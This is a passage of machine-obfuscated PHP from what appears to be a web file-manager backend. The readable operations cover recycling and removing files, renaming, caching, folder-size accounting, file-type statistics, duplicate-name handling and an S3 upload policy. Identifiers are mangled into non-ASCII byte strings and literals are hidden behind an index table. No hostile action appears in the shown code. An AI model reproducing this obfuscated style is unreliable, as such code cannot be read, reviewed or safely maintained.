($İçÂ‚¢Á) { Model($ãõÔ–“[2129])->moveToRecycle($ÁØÙ¡‡İ); } else { $àß“¸Ó‡ = $this->childrenAll($â¡ÁìŞ); Model($ãõÔ–“[578])->eventRemove($ÁØÙ¡‡İ); $this->removeRelevance($àß“¸Ó‡[$ãõÔ–“[2128]], $àß“¸Ó‡[$ãõÔ–“[1476]]); } $this->folderSizeReset($â¡ÁìŞ[$ãõÔ–“[440]]); $˜µòìÙÓ = array($â¡ÁìŞ[$ãõÔ–“[440]]); if ($â¡ÁìŞ[$ãõÔ–“[418]] == $ãõÔ–“[88]) { $˜µòìÙÓ[] = $â¡ÁìŞ[$ãõÔ–“[410]]; } $this->updateModifyTime($˜µòìÙÓ); $this->lockMoveEnd($ÁØÙ¡‡İ); Hook::trigger($ãõÔ–“[1703], $Ó›ğé¦ş, $İçÂ‚¢Á); return !0; } public function childrenAll($·ŒŠìï) { $×ÄåÛì¯ =& $_SERVER[ Ö‘ñÄ”]; $ÀÙ‡”õ = $·ŒŠìï[$×ÄåÛì¯[410]]; if ($·ŒŠìï[$×ÄåÛì¯[418]] == $×ÄåÛì¯[88]) { $·ÈèÏğû = array($×ÄåÛì¯[598] => array($×ÄåÛì¯[558], $·ŒŠìï[$×ÄåÛì¯[529]] . $ÀÙ‡”õ . $×ÄåÛì¯[559])); $¼üİâ‘¡ = array($×ÄåÛì¯[598] => $·ÈèÏğû[$×ÄåÛì¯[529]]); $‚æËÙ—Ì = $this->field($×ÄåÛì¯[2131])->where($¼üİâ‘¡)->select(); $ÌóÏ°¶— = !1; $€ŒÂ½ÁÚ = array($ÀÙ‡”õ); if ($‚æËÙ—Ì) { $ÌóÏ°¶— = array_to_keyvalue($‚æËÙ—Ì, $×ÄåÛì¯[12], $×ÄåÛì¯[476]); $ÌóÏ°¶— = array_remove_value($ÌóÏ°¶—, $×ÄåÛì¯[197]); $€ŒÂ½ÁÚ = array_to_keyvalue($‚æËÙ—Ì, $×ÄåÛì¯[12], $×ÄåÛì¯[410]); $€ŒÂ½ÁÚ[] = $ÀÙ‡”õ; } } else { $ÌóÏ°¶— = array($·ŒŠìï[$×ÄåÛì¯[476]]); $€ŒÂ½ÁÚ = array($ÀÙ‡”õ); } return array($×ÄåÛì¯[2128] => $€ŒÂ½ÁÚ, $×ÄåÛì¯[1476] => $ÌóÏ°¶—); } public function removeArray($œÛŞÇÈá) { if (!$œÛŞÇÈá) { return !0; } } public function removeRelevance($ï™¬ñí, $©œ¯·‚Ü) { $ìØ‹±®Â =& $_SERVER[ Ö‘ñÄ”]; $ï™¬ñí = $ï™¬ñí ? $ï™¬ñí : array(); $©œ¯·‚Ü = $©œ¯·‚Ü ? $©œ¯·‚Ü : array(); $ï™¬ñí = array_unique(array_filter($ï™¬ñí)); $©œ¯·‚Ü = array_unique(array_filter($©œ¯·‚Ü)); if (!$ï™¬ñí) { return !1; } $‰¿àßÇË = array($ìØ‹±®Â[425] => array($ìØ‹±®Â[426], $ï™¬ñí)); Model($ìØ‹±®Â[2129])->where($‰¿àßÇË)->delete(); Model($ìØ‹±®Â[470])->where($‰¿àßÇË)->delete(); Model($ìØ‹±®Â[1982])->where($‰¿àßÇË)->delete(); Model($ìØ‹±®Â[578])->where($‰¿àßÇË)->delete(); Model($ìØ‹±®Â[1816])->removeBySource($ï™¬ñí); Model($ìØ‹±®Â[2111])->removeBySource($ï™¬ñí); $this->where($‰¿àßÇË)->delete(); Model($ìØ‹±®Â[479])->remove($©œ¯·‚Ü); for ($»‘êÛ‚ = 0; $»‘êÛ‚ < count($ï™¬ñí); $»‘êÛ‚++) { $this->sourceCacheClear($ï™¬ñí[$»‘êÛ‚]); } } public function rename($ÕæÇîú¸, $ú¢¼¢·Ñ) { $º’ÌÃö× =& $_SERVER[ Ö‘ñÄ”]; $”–Â¹úæ = $this->sourceInfo($ÕæÇîú¸); if (!$”–Â¹úæ) { return !1; } $ˆ‰ÅÁ–Û = $this->fileNameExist($”–Â¹úæ[$º’ÌÃö×[440]], $ú¢¼¢·Ñ); if ($ˆ‰ÅÁ–Û && $ˆ‰ÅÁ–Û != $ÕæÇîú¸) { return !1; } $ì¤•’çƒ = array($º’ÌÃö×[428] => $ú¢¼¢·Ñ, $º’ÌÃö×[597] => USER_ID); if ($”–Â¹úæ[$º’ÌÃö×[418]] != $º’ÌÃö×[88]) { $ì¤•’çƒ[$º’ÌÃö×[420]] = substr(get_path_ext($ú¢¼¢·Ñ), 0, 10); } Model($º’ÌÃö×[578])->eventRename($ÕæÇîú¸, $”–Â¹úæ[$º’ÌÃö×[32]], $ú¢¼¢·Ñ); $this->sourceCacheClear($ÕæÇîú¸); $this->setNamePinyin($ÕæÇîú¸, $ì¤•’çƒ[$º’ÌÃö×[32]], !1); $this->updateModifyTime($”–Â¹úæ[$º’ÌÃö×[440]]); $˜»­Ä’É = $this->where(array($º’ÌÃö×[425] => $ÕæÇîú¸))->data($ì¤•’çƒ)->save(); $éŸ˜õ® = $º’ÌÃö×[2118] . $”–Â¹úæ[$º’ÌÃö×[440]]; if (isset(self::$cacheChildList[$éŸ˜õ®])) { unset(self::$cacheChildList[$éŸ˜õ®]); } return $˜»­Ä’É; } public function setNamePinyin($ÖÃøÙ¥, $¿·ÇÂëé, $ÙÉÎ‚é… = true) { $¬ïÒû²Ÿ =& $_SERVER[ Ö‘ñÄ”]; $ˆ¸á•“ñ = Input::check($¿·ÇÂëé, $¬ïÒû²Ÿ[601]); $Ã ùŠÑµ = array($¬ïÒû²Ÿ[452] => KodSort::makeStr($¿·ÇÂëé)); if ($ˆ¸á•“ñ) { $Ã ùŠÑµ[$¬ïÒû²Ÿ[473]] = str_replace($¬ïÒû²Ÿ[53], $¬ïÒû²Ÿ[12], Pinyin::get($¿·ÇÂëé)); $Ã ùŠÑµ[$¬ïÒû²Ÿ[472]] = Pinyin::get($¿·ÇÂëé, $¬ïÒû²Ÿ[602]); } if (!$ÙÉÎ‚é… && !$ˆ¸á•“ñ) { $Ã ùŠÑµ[$¬ïÒû²Ÿ[473]] = null; $Ã ùŠÑµ[$¬ïÒû²Ÿ[472]] = null; } $this->metaSet($ÖÃøÙ¥, $Ã ùŠÑµ); } public function getContent($©İ©ä¾Â) { $ÚşªÑ©ó =& $_SERVER[ Ö‘ñÄ”]; $ã¦æè³ = $this->fileInfoGet($©İ©ä¾Â); if (!$ã¦æè³) { return !1; } if ($ã¦æè³[$ÚşªÑ©ó[76]] == 0) { return $ÚşªÑ©ó[12]; } $ŠîÑ«Ë = $ÚşªÑ©ó[2132] . $ã¦æè³[$ÚşªÑ©ó[176]]; if ($ã¦æè³[$ÚşªÑ©ó[76]] <= 1024 * 10) { $¢ää–šª = Cache::get($ŠîÑ«Ë); if (!$¢ää–šª) { $¢ää–šª = IO::getContent($ã¦æè³[$ÚşªÑ©ó[84]]); Cache::set($ŠîÑ«Ë, $¢ää–šª); } return $¢ää–šª; } if (!$ã¦æè³[$ÚşªÑ©ó[84]]) { return $ÚşªÑ©ó[12]; } return IO::getContent($ã¦æè³[$ÚşªÑ©ó[84]]); } public function setDesc($Õ¥•Şµ÷, $³ÚÓõû¢) { $Ö£ØëòŒ =& $_SERVER[ Ö‘ñÄ”]; Model($Ö£ØëòŒ[578])->eventAddDesc($Õ¥•Şµ÷, $³ÚÓõû¢); return $this->metaSet($Õ¥•Şµ÷, $Ö£ØëòŒ[461], $³ÚÓõû¢); } public function setContent($Ï€‡¥³Ø, $ÖìÕŠÀò = '') { $ı÷øó®´ =& $_SERVER[ Ö‘ñÄ”]; $õ”ÀÀœÍ = $this->sourceInfo($Ï€‡¥³Ø); $õÖå–…‹ = $this->fileInfoGet($Ï€‡¥³Ø); if (!$õÖå–…‹ || !$õ”ÀÀœÍ) { return !1; } $¬Áª½ÛÉ = Model($ı÷øó®´[479])->addFileByContent($ÖìÕŠÀò, $õ”ÀÀœÍ[$ı÷øó®´[32]]); $ş†õ‚İ = $this->fileHistory($õ”ÀÀœÍ, $¬Áª½ÛÉ[$ı÷øó®´[476]], $¬Áª½ÛÉ[$ı÷øó®´[76]]); if (!$ş†õ‚İ) { return Model($ı÷øó®´[479])->remove($¬Áª½ÛÉ[$ı÷øó®´[476]]); } $this->folderSizeReset($õ”ÀÀœÍ[$ı÷øó®´[440]]); return !0; } public function fileSubstr($»ÊÔ–‹…, $…ã¸á•‰, $ ÑàìÍñ) { $»›ƒ»Ê = $this->fileInfoGet($»ÊÔ–‹…); if (!$»›ƒ»Ê) { return !1; } return IO::fileSubstr($»›ƒ»Ê[$_SERVER[ Ö‘ñÄ”][84]], $…ã¸á•‰, $ ÑàìÍñ); } public function fileInfoGet($àè™âˆº) { $É…öÑ¼ì =& $_SERVER[ Ö‘ñÄ”]; $µ”åà—– = $this->sourceInfo($àè™âˆº); if (!$µ”åà—– || $µ”åà—–[$É…öÑ¼ì[418]]) { return !1; } $òŞı˜Õ = $É…öÑ¼ì[482] . $µ”åà—–[$É…öÑ¼ì[476]]; $›½–¥ª¨ = _get(self::$cacheFileInfo, $òŞı˜Õ); if ($›½–¥ª¨) { return $›½–¥ª¨; } $ïî»°ø = Model($É…öÑ¼ì[479])->fileInfo($µ”åà—–[$É…öÑ¼ì[476]]); if ($ïî»°ø) { $ïî»°ø[$É…öÑ¼ì[32]] = $µ”åà—–[$É…öÑ¼ì[32]]; } self::$cacheFileInfo[$òŞı˜Õ] = $ïî»°ø; return $ïî»°ø; } private function folderChildrenNumber($º½‹È¾) { $‘®æè˜Ó =& $_SERVER[ Ö‘ñÄ”]; $Àê—”° = $this->sourceInfo($º½‹È¾); $ùÏÇ…æş = array($‘®æè˜Ó[598] => array($‘®æè˜Ó[558], $Àê—”°[$‘®æè˜Ó[529]] . $º½‹È¾ . $‘®æè˜Ó[559]), $‘®æè˜Ó[595] => $Àê—”°[$‘®æè˜Ó[513]], $‘®æè˜Ó[438] => intval($Àê—”°[$‘®æè˜Ó[439]]), $‘®æè˜Ó[591] => 1); $²Ì®è© = $this->where($ùÏÇ…æş)->count(); $›êäÙ× = $this->where($ùÏÇ…æş)->where(array($‘®æè˜Ó[591] => 0))->count(); return array($‘®æè˜Ó[80] => $›êäÙ×, $‘®æè˜Ó[81] => $²Ì®è©); } public function pathInfo($¤ëªø×, $½İÍş± = false) { $õè±Áì =& $_SERVER[ Ö‘ñÄ”]; $½İÍş± = !1; $¤ëªø× = intval($¤ëªø×); $»ÔŸüäÌ = $õè±Áì[469] . intval($½İÍş±) . $õè±Áì[394] . $¤ëªø×; $°üŠª› = _get(self::$cachePathInfo, $»ÔŸüäÌ); if ($°üŠª›) { return $°üŠª›; } $Àé™šª— = $this->sourceInfo($¤ëªø×); if (!$Àé™šª—) { return !1; } $Àé™šª— = $this->_listDataApplyItem($Àé™šª—, $½İÍş±); self::$cachePathInfo[$»ÔŸüäÌ] = $Àé™šª—; return $Àé™šª—; } public static $cachePathInfoMore = array(); public function pathInfoMore($¦ÛĞŸ¿õ) { $—ğ“Ìƒ– =& $_SERVER[ Ö‘ñÄ”]; $‰ğÂ• = _get(self::$cachePathInfoMore, $¦ÛĞŸ¿õ); if ($‰ğÂ•) { return $‰ğÂ•; } $ÛØïÇ€ş = $this->pathInfo($¦ÛĞŸ¿õ); if (!$ÛØïÇ€ş) { return !1; } if ($ÛØïÇ€ş[$—ğ“Ìƒ–[418]] == $—ğ“Ìƒ–[88]) { $ÛØïÇ€ş[$—ğ“Ìƒ–[79]] = $this->folderChildrenNumber($¦ÛĞŸ¿õ); } self::$cachePathInfoMore[$¦ÛĞŸ¿õ] = $ÛØïÇ€ş; return $ÛØïÇ€ş; } public function sourceInfo($ÀâÌá“á) { $Çî¾¸¾ =& $_SERVER[ Ö‘ñÄ”]; if (!$ÀâÌá“á) { return array(); } $ÀâÌá“á = intval($ÀâÌá“á); $´ó‚¶ƒš = $Çî¾¸¾[468] . $ÀâÌá“á; $ğã€ßìä = _get(self::$cacheSourceInfo, $´ó‚¶ƒš); if ($ğã€ßìä) { return $ğã€ßìä; } $ÆÃ¬µ = $this->where(array($Çî¾¸¾[410] => $ÀâÌá“á))->find(); self::$cacheSourceInfo[$´ó‚¶ƒš] = $ÆÃ¬µ; return self::$cacheSourceInfo[$´ó‚¶ƒš]; } public function sourceCacheClear($³Á«Ÿ”‘ = false) { self::cacheClear($³Á«Ÿ”‘); } public static function cacheClear($­©¬¡…Ï = false) { $µŸØÑ•· =& $_SERVER[ Ö‘ñÄ”]; if ($­©¬¡…Ï == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$µŸØÑ•·[468] . $­©¬¡…Ï]); unset(self::$cachePathInfoMore[$­©¬¡…Ï]); unset(self::$cachePathInfo[$µŸØÑ•·[2133] . $­©¬¡…Ï]); unset(self::$cachePathInfo[$µŸØÑ•·[2134] . $­©¬¡…Ï]); } public function metaSet($ÉªØÌË, $œñ¹§°Ñ = null, $·©Ï›—Ô = null) { $–Èƒ = parent::metaSet($ÉªØÌË, $œñ¹§°Ñ, $·©Ï›—Ô); if ($–Èƒ) { $this->sourceCacheClear($ÉªØÌË); } return $–Èƒ; } public function pathInfoByPath($÷èš‘Î, $ÔŒï ºÎ) { $½µëî«› =& $_SERVER[ Ö‘ñÄ”]; $ûˆùˆÂ¥ = !$ÔŒï ºÎ ? array() : explode($½µëî«›[8], trim($ÔŒï ºÎ, $½µëî«›[8])); $ö™½×Çê = $÷èš‘Î; foreach ($ûˆùˆÂ¥ as $ù¸Áµ°à) { $Õıšß×Å = array($½µëî«›[440] => $ö™½×Çê, $½µëî«›[32] => $ù¸Áµ°à); $Ş§£—½ = $this->where($Õıšß×Å)->select(); if (!$Ş§£—½) { return !1; } $Ş§£—½ = array_sort_by($Ş§£—½, $½µëî«›[439]); $ö™½×Çê = $Ş§£—½[0][$½µëî«›[410]]; } return $this->pathInfo($ö™½×Çê, !0); } protected function updateModifyTime($å–æì‹Ş) { $ˆì®—ÈÉ =& $_SERVER[ Ö‘ñÄ”]; $´£¥üê¤ = defined($ˆì®—ÈÉ[483]) ? USER_ID : $ˆì®—ÈÉ[197]; if (!$å–æì‹Ş) { return; } if (!is_array($å–æì‹Ş)) { $å–æì‹Ş = array($å–æì‹Ş); } foreach ($å–æì‹Ş as $ˆÀÒ¶“Ü => $±Æ·™° ) { $å–æì‹Ş[$ˆÀÒ¶“Ü] = intval($±Æ·™° ); $this->sourceCacheClear($±Æ·™° ); } $éÔª­‹× = array($ˆì®—ÈÉ[410] => array($ˆì®—ÈÉ[7], $å–æì‹Ş)); $’Ë²×Î = array($ˆì®—ÈÉ[597] => $´£¥üê¤, $ˆì®—ÈÉ[432] => time()); $this->where($éÔª­‹×)->save($’Ë²×Î); } public function folderSizeReset($·²öËø, $ÛÄúÔœŠ = false) { $­ñ±Ä¯É =& $_SERVER[ Ö‘ñÄ”]; if ($this->statusIgnoreResetSpace) { return; } $Ã…¤‰íé = $this->sourceInfo($·²öËø); $ô´Ø¥ñ´ = $­ñ±Ä¯É[2135] . $·²öËø; CacheLock::lock($ô´Ø¥ñ´, 20); if ($ÛÄúÔœŠ === !1) { $this->sourceCacheClear($·²öËø); $Ã…¤‰íé = $this->sourceInfo($·²öËø); $ÂøÒí×ş = array($­ñ±Ä¯É[409] => $·²öËø, $­ñ±Ä¯É[438] => 0); $àğïÏ×¬ = $this->where($ÂøÒí×ş)->sum($­ñ±Ä¯É[76]); $ÛÄúÔœŠ = intval($àğïÏ×¬) - intval($Ã…¤‰íé[$­ñ±Ä¯É[76]]); } if ($ÛÄúÔœŠ == 0) { return CacheLock::unlock($ô´Ø¥ñ´); } $¡©ı×¼º = $this->parentLevelArray($Ã…¤‰íé[$­ñ±Ä¯É[529]]); if (!$¡©ı×¼º) { $¡©ı×¼º = array(); } $¡©ı×¼º[] = $Ã…¤‰íé[$­ñ±Ä¯É[410]]; $ÂøÒí×ş = array($­ñ±Ä¯É[410] => array($­ñ±Ä¯É[426], $¡©ı×¼º)); if ($ÛÄúÔœŠ < 0) { $ÂøÒí×ş[$­ñ±Ä¯É[76]] = array($­ñ±Ä¯É[1021], abs($ÛÄúÔœŠ)); } $this->where($ÂøÒí×ş)->setAdd($­ñ±Ä¯É[76], $ÛÄúÔœŠ); CacheLock::unlock($ô´Ø¥ñ´); $ÓÁ£ò€Ú = $­ñ±Ä¯É[2136] . $Ã…¤‰íé[$­ñ±Ä¯É[419]] . $­ñ±Ä¯É[4] . $Ã…¤‰íé[$­ñ±Ä¯É[513]]; $Ãë±ˆŠ® = array($Ã…¤‰íé[$­ñ±Ä¯É[419]], $Ã…¤‰íé[$­ñ±Ä¯É[513]]); TaskRun::timeLimitCall($ÓÁ£ò€Ú, $­ñ±Ä¯É[2137], $Ãë±ˆŠ®, 1.5); } public function folderSizeResetChildren($“Æ–Û¡) { $Ù‹àÏö =& $_SERVER[ Ö‘ñÄ”]; $this->sourceCacheClear($“Æ–Û¡); $„Ô¹ßãÚ = $this->sourceInfo($“Æ–Û¡); $äúúĞ“ó = array($Ù‹àÏö[591] => 1, $Ù‹àÏö[595] => $„Ô¹ßãÚ[$Ù‹àÏö[513]], $Ù‹àÏö[598] => array($Ù‹àÏö[558], $„Ô¹ßãÚ[$Ù‹àÏö[529]] . $“Æ–Û¡ . $Ù‹àÏö[559])); $–³±Şøë = $Ù‹àÏö[2138]; $Š™¡¨ = $this->field($–³±Şøë)->where($äúúĞ“ó)->select(); $äúúĞ“ó[$Ù‹àÏö[418]] = 0; $Ë¾şŸ¼¡ = $this->field($–³±Şøë)->where($äúúĞ“ó)->select(); if (!$Ë¾şŸ¼¡) { return; } $Š™¡¨[] = $„Ô¹ßãÚ; $Š™¡¨ = array_to_keyvalue($Š™¡¨, $Ù‹àÏö[410]); foreach ($Š™¡¨ as $à¦´°ä© => $âôÆµ) { $Š™¡¨[$à¦´°ä©][$Ù‹àÏö[2139]] = $Š™¡¨[$à¦´°ä©][$Ù‹àÏö[76]]; $Š™¡¨[$à¦´°ä©][$Ù‹àÏö[76]] = 0; } foreach ($Ë¾şŸ¼¡ as $âôÆµ) { $»ñÔ€éÅ = $âôÆµ[$Ù‹àÏö[440]] . $Ù‹àÏö[12]; if (!isset($Š™¡¨[$»ñÔ€éÅ])) { continue; } if ($âôÆµ[$Ù‹àÏö[439]] == $Š™¡¨[$»ñÔ€éÅ][$Ù‹àÏö[439]]) { $Š™¡¨[$»ñÔ€éÅ][$Ù‹àÏö[76]] += $âôÆµ[$Ù‹àÏö[76]]; } } foreach ($Š™¡¨ as $âôÆµ) { $‰ñ‹µâÌ = $this->parentLevelArray($âôÆµ[$Ù‹àÏö[529]]); foreach ($‰ñ‹µâÌ as $»ñÔ€éÅ) { $»ñÔ€éÅ = $»ñÔ€éÅ . $Ù‹àÏö[12]; if (!isset($Š™¡¨[$»ñÔ€éÅ])) { continue; } if ($âôÆµ[$Ù‹àÏö[439]] == $Š™¡¨[$»ñÔ€éÅ][$Ù‹àÏö[439]]) { $Š™¡¨[$»ñÔ€éÅ][$Ù‹àÏö[76]] += $âôÆµ[$Ù‹àÏö[76]]; } } } $Ê®ç¡Í€ = array(); foreach ($Š™¡¨ as $âôÆµ) { if ($âôÆµ[$Ù‹àÏö[76]] == $âôÆµ[$Ù‹àÏö[2139]]) { continue; } $Ê®ç¡Í€[] = array($Ù‹àÏö[410], $âôÆµ[$Ù‹àÏö[410]], $Ù‹àÏö[76], $âôÆµ[$Ù‹àÏö[76]]); } $this->saveAll($Ê®ç¡Í€); } public function userSpaceReset($ıŒ€˜Á = false) { $ì×Áœ„á =& $_SERVER[ Ö‘ñÄ”]; $ü»ˆ™´ = $this->where(array($ì×Áœ„á[419] => self::TYPE_USER, $ì×Áœ„á[513] => $ıŒ€˜Á, $ì×Áœ„á[418] => 0))->sum($ì×Áœ„á[76]); $ü»ˆ™´ = !$ü»ˆ™´ || $ü»ˆ™´ <= 0 ? 0 : $ü»ˆ™´; Model($ì×Áœ„á[521])->userEdit($ıŒ€˜Á, array($ì×Áœ„á[1825] => $ü»ˆ™´)); } public function targetSpaceUpdate($ÁÎşÈøó, $É¬“Í) { $çãµ™àÙ =& $_SERVER[ Ö‘ñÄ”]; if (!$É¬“Í) { return; } if (!in_array($ÁÎşÈøó, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $¨§êŠş‰ = $this->targetSpaceSize($ÁÎşÈøó, $É¬“Í); if ($ÁÎşÈøó == self::TYPE_USER) { Model($çãµ™àÙ[521])->userEdit($É¬“Í, array($çãµ™àÙ[1825] => $¨§êŠş‰)); } else { if ($ÁÎşÈøó == self::TYPE_GROUP) { Model($çãµ™àÙ[530])->groupEdit($É¬“Í, array($çãµ™àÙ[1825] => $¨§êŠş‰)); } } } public function targetSpaceSize($½ïœÍûî, $»˜¹Ç®å) { $£ºÕ‚²ç =& $_SERVER[ Ö‘ñÄ”]; $œ™¹îÊä = 0; $¤Í»˜“ó = $this->sourceRoot($½ïœÍûî, $»˜¹Ç®å, !0); foreach ($¤Í»˜“ó as $ÒãÚê‘¡) { if (!$ÒãÚê‘¡) { continue; } $œ™¹îÊä += floatval($ÒãÚê‘¡[$£ºÕ‚²ç[76]]); $š¼ŞÕÇ« = array($£ºÕ‚²ç[598] => array($£ºÕ‚²ç[558], $£ºÕ‚²ç[539] . $ÒãÚê‘¡[$£ºÕ‚²ç[410]] . $£ºÕ‚²ç[559])); $Ñ¤ú‰ª½ = Model($£ºÕ‚²ç[437])->field($£ºÕ‚²ç[425])->where($š¼ŞÕÇ«)->select(); $Ñ¤ú‰ª½ = array_to_keyvalue($Ñ¤ú‰ª½, $£ºÕ‚²ç[12], $£ºÕ‚²ç[410]); $Ñ¤ú‰ª½ = array_unique(array_filter($Ñ¤ú‰ª½)); if ($Ñ¤ú‰ª½) { $š¼ŞÕÇ« = array($£ºÕ‚²ç[425] => array($£ºÕ‚²ç[426], $Ñ¤ú‰ª½)); $œ™¹îÊä += floatval($this->where($š¼ŞÕÇ«)->sum($£ºÕ‚²ç[76])); } } $œ™¹îÊä = !$œ™¹îÊä || $œ™¹îÊä <= 0 ? 0 : $œ™¹îÊä; return $œ™¹îÊä; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($›˜Š¹´) { return $this->fileTypeProfile($›˜Š¹´, SourceModel::TYPE_USER); } public function groupFileTypeProfile($ğ‹¹²ó) { return $this->fileTypeProfile($ğ‹¹²ó, SourceModel::TYPE_GROUP); } private function fileTypeProfile($æ©Òæî„, $ÕÖÌÖÔÇ) { $ìù©ª« =& $_SERVER[ Ö‘ñÄ”]; $á£¹š˜ç = $ìù©ª«[2140] . $æ©Òæî„ . $ìù©ª«[11] . $ÕÖÌÖÔÇ; $×ŞÛØÜ× = Cache::get($á£¹š˜ç); if ($×ŞÛØÜ×) { return $×ŞÛØÜ×; } $ƒØÄãŸ° = array($ìù©ª«[591] => 0); if ($æ©Òæî„ != !1) { $ƒØÄãŸ°[$ìù©ª«[513]] = $æ©Òæî„; $ƒØÄãŸ°[$ìù©ª«[419]] = $ÕÖÌÖÔÇ; } $íñÄ»È = array(); $íñÄ»È[$ìù©ª«[2141]] = array($ìù©ª«[2142] => LNG($ìù©ª«[2141]), $ìù©ª«[2143] => $this->where($ƒØÄãŸ°)->count(), $ìù©ª«[593] => $this->where($ƒØÄãŸ°)->sum($ìù©ª«[76])); $ç¥¡õàı = KodIO::fileTypeList(); foreach ($ç¥¡õàı as $şğ±ˆœŠ => $ØÕ±èÛ) { $ƒØÄãŸ°[$ìù©ª«[420]] = $this->fileTypeWhere($şğ±ˆœŠ); $íñÄ»È[$şğ±ˆœŠ] = array($ìù©ª«[2142] => $ØÕ±èÛ[$ìù©ª«[32]], $ìù©ª«[2143] => $this->where($ƒØÄãŸ°)->count(), $ìù©ª«[593] => $this->where($ƒØÄãŸ°)->sum($ìù©ª«[76])); } Cache::set($á£¹š˜ç, $íñÄ»È, 1200); return $íñÄ»È; } public function fileNameExist($¢Ïæ°Üİ, $ÉÉµ›ä) { $ØŠƒ¹° =& $_SERVER[ Ö‘ñÄ”]; $ä£³© = $this->where(array($ØŠƒ¹°[440] => $¢Ïæ°Üİ, $ØŠƒ¹°[32] => $ÉÉµ›ä, $ØŠƒ¹°[439] => 0))->find(); return is_array($ä£³©) ? $ä£³©[$ØŠƒ¹°[410]] : !1; } public function childList($áÕÔ°ËÃ) { $šì´Ú„à =& $_SERVER[ Ö‘ñÄ”]; $ûç¶å°¡ = $šì´Ú„à[2118] . $áÕÔ°ËÃ; if (isset(self::$cacheChildList[$ûç¶å°¡])) { return self::$cacheChildList[$ûç¶å°¡]; } $ò»ùÆÌ  = array($šì´Ú„à[440] => intval($áÕÔ°ËÃ), $šì´Ú„à[439] => 0); $Û¤Ôå¹ = $this->where($ò»ùÆÌ )->select(); $Û¤Ôå¹ = $Û¤Ôå¹ ? $Û¤Ôå¹ : array(); self::$cacheChildList[$ûç¶å°¡] = $Û¤Ôå¹; foreach ($Û¤Ôå¹ as $Èîù©˜í) { $ûç¶å°¡ = $šì´Ú„à[468] . $Èîù©˜í[$šì´Ú„à[410]]; self::$cacheSourceInfo[$ûç¶å°¡] = $Èîù©˜í; } return $Û¤Ôå¹; } public function fileNameAuto($Åİ®ĞÖ­, $ÓŸŠÓÀì, $ŞÓí•£ = REPEAT_RENAME, $°òÇ”¿÷ = false) { $Ãöö‹Ûá =& $_SERVER[ Ö‘ñÄ”]; $ ²‹Š¸Ú = get_path_ext($ÓŸŠÓÀì); $£ÎãØ¢Ù = $ ²‹Š¸Ú ? basename($ÓŸŠÓÀì, $Ãöö‹Ûá[10] . $ ²‹Š¸Ú) . $Ãöö‹Ûá[2144] . $ ²‹Š¸Ú : $ÓŸŠÓÀì . $Ãöö‹Ûá[392]; $•½ÖéïÇ = array($Ãöö‹Ûá[440] => $Åİ®ĞÖ­, $Ãöö‹Ûá[439] => 0, $Ãöö‹Ûá[32] => array($Ãöö‹Ûá[391], $£ÎãØ¢Ù)); $¶ÒÃ²í = $this->field($Ãöö‹Ûá[32])->where($•½ÖéïÇ)->select(); $åÓØ²ïã = array_to_keyvalue($¶ÒÃ²í, $Ãöö‹Ûá[12], $Ãöö‹Ûá[32]); return $this->fileNameAutoGet($åÓØ²ïã, $ÓŸŠÓÀì, $ŞÓí•£, $°òÇ”¿÷); } public function fileNameAutoGet($™€ê—“Ë, $îœ‡âı£, $‘µüìöæ, $¾ï•¥â¸) { $ŸŠ®ßÔ˜ =& $_SERVER[ Ö‘ñÄ”]; if ($‘µüìöæ == REPEAT_REPLACE || !$™€ê—“Ë || !in_array_not_case($îœ‡âı£, $™€ê—“Ë) || $¾ï•¥â¸ && $‘µüìöæ != REPEAT_RENAME_FOLDER) { return $îœ‡âı£; } if ($‘µüìöæ == REPEAT_SKIP) { return !1; } $ß «¹´½ = $ŸŠ®ßÔ˜[10] . get_path_ext($îœ‡âı£); $ß «¹´½ = $ß «¹´½ == $ŸŠ®ßÔ˜[10] || $¾ï•¥â¸ ? $ŸŠ®ßÔ˜[12] : $ß «¹´½; for ($Ğä™è˜• = 1; $Ğä™è˜• <= count($™€ê—“Ë) + 1; $Ğä™è˜•++) { $ĞÃÂ”ì = substr($îœ‡âı£, 0, strlen($îœ‡âı£) - strlen($ß «¹´½)); $š‚ÖÙ’§ = $ĞÃÂ”ì . "\50{$Ğä™è˜•}\x29{$ß «¹´½}"; if (!in_array_not_case($š‚ÖÙ’§, $™€ê—“Ë)) { return $š‚ÖÙ’§; } } } } goto FŒÙ³›©Á; déï‚ğù†Õ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($€Ø¿Ïâñ) { parent::__construct($€Ø¿Ïâñ); } public function uploadFormData($Œ¤óßãû, $ë˜ôßÓî = 3600) { $Ÿó¾¢ğ› =& $_SERVER[ Ö‘ñÄ”]; $ø„ €¡‡ = $Ÿó¾¢ğ›[198]; $¬ÙÑè‡ = $Ÿó¾¢ğ›[1352]; $¬ÇŸë³ù = $Ÿó¾¢ğ›[62]; $Ÿïæ¢Ì = gmdate($Ÿó¾¢ğ›[1353]); $µûøÛ˜„ = gmdate($Ÿó¾¢ğ›[764]); $÷Ş’¤–Õ = $Ÿó¾¢ğ›[1354]; $¤¤Ã”á = $ë˜ôßÓî . $Ÿó¾¢ğ›[12]; $å­ñÁ£¬ = $Ÿó¾¢ğ›[1316]; $üšÃˆ¸ = array($this->accessKey, $µûøÛ˜„, $this->region, $¬ÇŸë³ù, $÷Ş’¤–Õ); $ó…ö°ƒˆ = implode($Ÿó¾¢ğ›[8], $üšÃˆ¸); $™ı¤ÉüÆ = array($Ÿó¾¢ğ›[1318] => gmdate($Ÿó¾¢ğ›[1317], strtotime($Ÿó¾¢ğ›[1355])), $Ÿó¾¢ğ›[1319] => array(array($Ÿó¾¢ğ›[1321] => $this->bucket), array($Ÿó¾¢ğ›[1320] => $ø„ €¡‡), array($Ÿó¾¢ğ›[1322], $Ÿó¾¢ğ›[1323], $Ÿó¾¢ğ›[12]), array($Ÿó¾¢ğ›[1322], $Ÿó¾¢ğ›[1356], $Ÿó¾¢ğ›[12]), array($Ÿó¾¢ğ›[1322], $Ÿó¾¢ğ›[1357], $Ÿó¾¢ğ›[12]), array($Ÿó¾¢ğ›[1324] => $å­ñÁ£¬), array($Ÿó¾¢ğ›[1358] => $ó…ö°ƒˆ), array($Ÿó¾¢ğ›[1359] => $¬ÙÑè‡), array($Ÿó¾¢ğ›[1360] => $Ÿïæ¢Ì), array($Ÿó¾¢ğ›[1361] => $¤¤Ã”á))); $‹ëøåÙ¥ = 